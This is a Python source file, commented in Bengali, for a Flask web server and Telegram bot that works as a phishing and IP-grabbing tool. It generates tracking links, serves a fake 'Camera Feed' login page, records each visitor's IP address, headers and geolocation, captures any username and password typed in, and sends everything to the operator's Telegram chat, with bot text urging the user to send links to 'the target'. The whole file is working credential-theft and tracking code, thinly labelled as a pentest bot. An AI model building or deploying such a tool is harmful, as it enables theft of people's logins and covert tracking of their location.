import os
import json
import uuid
import requests
from datetime import datetime
from flask import Flask, request, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler

# ============ কনফিগারেশন ============
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
ADMIN_ID = 123456789  # আপনার টেলিগ্রাম ইউজার ID
WEBHOOK_DOMAIN = "https://fishing-rykp.onrender.com"  # আপনার VPS বা Render.com URL
# ====================================

app = Flask(__name__)

# ডাটাবেস (সিম্পল JSON ফাইল)
DB_FILE = "grabs.json"
if os.path.exists(DB_FILE):
    with open(DB_FILE) as f:
        grabs_db = json.load(f)
else:
    grabs_db = {}

def save_db():
    with open(DB_FILE, "w") as f:
        json.dump(grabs_db, f)

def get_location(ip):
    """IP থেকে আনুমানিক লোকেশন বের করা"""
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = resp.json()
        if data.get("status") == "success":
            return {
                "country": data.get("country", "N/A"),
                "city": data.get("city", "N/A"),
                "isp": data.get("isp", "N/A"),
                "lat": data.get("lat"),
                "lon": data.get("lon"),
                "org": data.get("org", "N/A")
            }
    except:
        pass
    return {"country": "Unknown", "city": "Unknown"}

# ================== Flask রুট (Grabbing Page) ==================
FAKE_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 100px; background: #0d0d0d; color: white; }
        .spinner { border: 4px solid #333; border-top: 4px solid #00ff88; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .card { background: #1a1a2e; max-width: 400px; margin: auto; padding: 40px; border-radius: 15px; }
        input { width: 80%; padding: 12px; margin: 8px; border-radius: 8px; border: none; }
        button { padding: 12px 30px; background: #00ff88; color: black; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
        .loading-text { color: #888; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🔒 Camera Feed</h2>
        <p>Enter credentials to view live stream</p>
        <div id="loginForm">
            <input type="text" id="username" placeholder="Username" value="admin"><br>
            <input type="password" id="password" placeholder="Password"><br>
            <button onclick="submitForm()">Connect</button>
        </div>
        <div id="loading" style="display:none;">
            <div class="spinner"></div>
            <p class="loading-text">Connecting to secure stream...</p>
        </div>
    </div>
    <script>
        // ইউজারের IP ইতিমধ্যে ব্যাকএন্ডে ক্যাপচার হয়ে গেছে
        function submitForm() {
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            // ফর্ম ডাটাও পাঠাই ব্যাকএন্ডে
            fetch('/capture/' + window.location.pathname.split('/')[2], {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    user: document.getElementById('username').value,
                    pass: document.getElementById('password').value
                })
            });
            setTimeout(() => {
                document.getElementById('loading').innerHTML = '<h3>❌ Connection Failed</h3><p>Invalid credentials or server timeout</p><button onclick="location.reload()">Retry</button>';
            }, 3000);
        }
    </script>
</body>
</html>
"""

@app.route("/grab/<grab_id>")
def grab_page(grab_id):
    """ভিক্টিম লিংকে ক্লিক করলে এই পেজ লোড হয়"""
    # সব তথ্য সংগ্রহ
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    
    info = {
        "ip": ip,
        "user_agent": request.headers.get("User-Agent", "N/A"),
        "referer": request.headers.get("Referer", "N/A"),
        "timestamp": datetime.now().isoformat(),
        "headers": dict(request.headers),
        "location": get_location(ip),
        "credentials": None
    }
    
    # ডাটাবেজে সেভ
    grabs_db[grab_id] = info
    save_db()
    
    # টেলিগ্রামে নোটিফিকেশন পাঠাই
    send_grab_notification(grab_id, info)
    
    return render_template_string(FAKE_PAGE)

@app.route("/capture/<grab_id>", methods=["POST"])
def capture_credentials(grab_id):
    """ইউজার যদি ফর্ম সাবমিট করে, ক্রেডেনশিয়াল ক্যাপচার"""
    data = request.json
    if grab_id in grabs_db:
        grabs_db[grab_id]["credentials"] = data
        save_db()
        # ক্রেডেনশিয়াল নোটিফিকেশন
        send_cred_notification(grab_id, data)
    return {"status": "ok"}

# ================== টেলিগ্রাম ফাংশন ==================
def send_grab_notification(grab_id, info):
    """ক্লিক ডিটেক্টেড — টেলিগ্রামে মেসেজ পাঠানো"""
    loc = info.get("location", {})
    text = (
        f"⚠️ **NEW CLICK DETECTED** ⚠️\n\n"
        f"📌 **ID:** `{grab_id}`\n"
        f"🌐 **IP:** `{info['ip']}`\n"
        f"📍 **Location:** {loc.get('city', '?')}, {loc.get('country', '?')}\n"
        f"🏢 **ISP:** {loc.get('isp', '?')}\n"
        f"🌍 **Google Maps:** https://www.google.com/maps?q={loc.get('lat', '0')},{loc.get('lon', '0')}\n"
        f"🖥 **User-Agent:** `{info['user_agent'][:100]}`\n"
        f"⏰ **Time:** {info['timestamp']}\n"
        f"🔗 **Link:** `{WEBHOOK_DOMAIN}/grab/{grab_id}`"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": ADMIN_ID, "text": text, "parse_mode": "Markdown"})

def send_cred_notification(grab_id, creds):
    """ইউজার ক্রেডেনশিয়াল দিলে তা পাঠানো"""
    text = (
        f"🔑 **CREDENTIALS CAPTURED!** 🔑\n\n"
        f"📌 **ID:** `{grab_id}`\n"
        f"👤 **Username:** `{creds.get('user', 'N/A')}`\n"
        f"🔐 **Password:** `{creds.get('pass', 'N/A')}`"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": ADMIN_ID, "text": text, "parse_mode": "Markdown"})

async def start(update: Update, context):
    """বট স্টার্ট কমান্ড"""
    await update.message.reply_text(
        "🎯 **Camera Pentest Bot Active**\n\n"
        "Commands:\n"
        "`/newlink` — Generate a new grab link\n"
        "`/stats` — Show all grabbed data\n"
        "`/view <id>` — View specific grab details\n"
        "`/links` — All active links"
    )

async def newlink(update: Update, context):
    """নতুন গ্র্যাব লিংক জেনারেট"""
    grab_id = str(uuid.uuid4())[:8]
    link = f"{WEBHOOK_DOMAIN}/grab/{grab_id}"
    
    grabs_db[grab_id] = {"created": datetime.now().isoformat(), "status": "active"}
    save_db()
    
    keyboard = [[InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{grab_id}")]]
    reply = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"✅ **New grab link created!**\n\n"
        f"🔗 `{link}`\n\n"
        f"Send this link to the target. When they click it,\n"
        f"all information will be sent here automatically.",
        reply_markup=reply
    )

async def stats(update: Update, context):
    """সব গ্র্যাবের স্ট্যাটাস দেখা"""
    if not grabs_db:
        await update.message.reply_text("No grabs yet.")
        return
    
    total_clicks = sum(1 for v in grabs_db.values() if "ip" in v)
    total_creds = sum(1 for v in grabs_db.values() if v.get("credentials"))
    
    text = f"📊 **Dashboard**\n\n"
    text += f"Total links created: `{len(grabs_db)}`\n"
    text += f"Total clicks: `{total_clicks}`\n"
    text += f"Credentials captured: `{total_creds}`\n"
    text += f"\nActive links:\n"
    
    for gid, data in list(grabs_db.items())[:10]:
        status = "✅ Clicked" if "ip" in data else "⏳ Pending"
        text += f"• `{gid}` — {status}\n"
    
    await update.message.reply_text(text)

async def view_grab(update: Update, context):
    """একটা নির্দিষ্ট গ্র্যাবের বিস্তারিত দেখা"""
    if not context.args:
        await update.message.reply_text("Usage: `/view <grab_id>`")
        return
    
    grab_id = context.args[0]
    if grab_id not in grabs_db:
        await update.message.reply_text("Invalid ID.")
        return
    
    data = grabs_db[grab_id]
    if "ip" not in data:
        await update.message.reply_text(f"⏳ No one clicked `{grab_id}` yet.")
        return
    
    loc = data.get("location", {})
    text = (
        f"📋 **Grab Details: `{grab_id}`**\n\n"
        f"🌐 **IP:** `{data['ip']}`\n"
        f"📍 **Location:** {loc.get('city', '?')}, {loc.get('country', '?')}\n"
        f"🏢 **ISP:** {loc.get('isp', '?')}\n"
        f"🌍 **Maps:** https://www.google.com/maps?q={loc.get('lat', '0')},{loc.get('lon', '0')}\n"
        f"🖥 **UA:** `{data.get('user_agent', 'N/A')[:80]}`\n"
        f"⏰ **Time:** {data.get('timestamp', '?')}"
    )
    
    if data.get("credentials"):
        creds = data["credentials"]
        text += f"\n\n🔑 **Credentials:** `{creds.get('user', '?')}` : `{creds.get('pass', '?')}`"
    
    await update.message.reply_text(text)

async def list_links(update: Update, context):
    """সকল সক্রিয় লিংক"""
    text = "🔗 **All Grab Links:**\n\n"
    for gid, data in list(grabs_db.items())[:20]:
        status = "✅" if "ip" in data else "⏳"
        text += f"{status} `{WEBHOOK_DOMAIN}/grab/{gid}`\n"
    
    await update.message.reply_text(text)

async def button_callback(update: Update, context):
    """কপি বাটন কলব্যাক"""
    query = update.callback_query
    await query.answer("Copy this link and send to target!")

# ================== মেইন ==================
def run_bot():
    """টেলিগ্রাম বট চালানো"""
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("newlink", newlink))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(CommandHandler("view", view_grab))
    application.add_handler(CommandHandler("links", list_links))
    application.add_handler(CallbackQueryHandler(button_callback))
    print("🤖 Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    from threading import Thread
    # Flask সার্ভার আলাদা থ্রেডে চলে
    t = Thread(target=lambda: app.run(host="0.0.0.0", port=5000, debug=False))
    t.start()
    run_bot()
